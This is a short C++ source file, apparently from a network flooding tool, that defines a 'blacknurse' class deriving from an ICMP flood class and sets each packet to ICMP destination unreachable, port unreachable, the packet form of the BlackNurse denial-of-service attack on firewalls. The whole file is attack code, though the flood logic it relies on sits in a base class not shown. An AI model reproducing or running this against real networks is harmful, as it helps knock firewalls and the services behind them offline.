#include "blacknurse.hpp"

blacknurse::blacknurse() : icmp_flood() {}

void blacknurse::finalize_hdr(icmphdr *icmp, iphdr *ip) {
  icmp->type = ICMP_DEST_UNREACH;
  icmp->code = ICMP_PORT_UNREACH;
  icmp_flood::finalize_hdr(icmp, ip);
}
